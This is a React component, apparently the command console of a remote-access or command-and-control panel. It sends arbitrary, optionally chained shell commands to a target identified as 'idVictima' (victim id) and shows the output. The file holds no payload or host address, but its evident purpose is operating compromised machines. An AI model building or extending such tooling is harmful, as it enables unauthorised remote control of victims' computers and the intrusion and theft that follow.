import React, { useContext, useState } from 'react';
import { ContextHome } from "../../context/ContextHome"

function Comandos() {
  const { idVictima, ejecutarComando, respuesta_comando } = useContext(ContextHome)


  const [comandoEjecutar, setcomandoEjecutar] = useState('')
  const [comand, setcomand] = useState('')
  const [estadoRecuperado, setStadoR] = useState(false)
  const [estadoComando, setestadoComando] = useState(true)


  const recuperarComando = (e) => {
    e.preventDefault();
    setcomand(comandoEjecutar)
    setStadoR(true)
  }

  //funciones
  const EjecutarComando = (e, comando) => {
    e.preventDefault();

    let nuevoComandoEjecutar = '';
    if (estadoRecuperado) {
      nuevoComandoEjecutar = comando
      setStadoR(false)
    } else if (comando != '') {
      if (estadoComando) {
        nuevoComandoEjecutar = comandoEjecutar == '' ? comando : comandoEjecutar + ' & ' + comando;
      } else {
        nuevoComandoEjecutar = comando
      }
    }

    setcomandoEjecutar(nuevoComandoEjecutar)

    if (nuevoComandoEjecutar != '') {
      console.log('comando:' + nuevoComandoEjecutar)
      setcomand('');
      ejecutarComando(idVictima, nuevoComandoEjecutar)
    } else {
      alert('ingresa un comando')
    }


  }



  return (
    <>
      <div>
        <div className="mb-3">
          <input type='checkbox' className="form-check-input" checked={estadoComando} onChange={(e) => setestadoComando(e.target.checked)} /> Comando Continuo
          <input type="text" className="form-control" placeholder='comando'
            value={comand}
            onChange={(e) => setcomand(e.target.value)}
            onKeyDown={(e) => {
              if (e.key === 'Enter') { EjecutarComando(e, e.target.value); }
            }} />
          <p className='text-danger' style={{ fontSize: '14px' }} onClick={(e) => recuperarComando(e)}>{comandoEjecutar}</p>
        </div>

        <div className="mb-3">
          <textarea className="form-control" name="descripcion" rows="10" placeholder='' disabled value={respuesta_comando}>
          </textarea>
        </div>
      </div>
    </>
  )
}

export default Comandos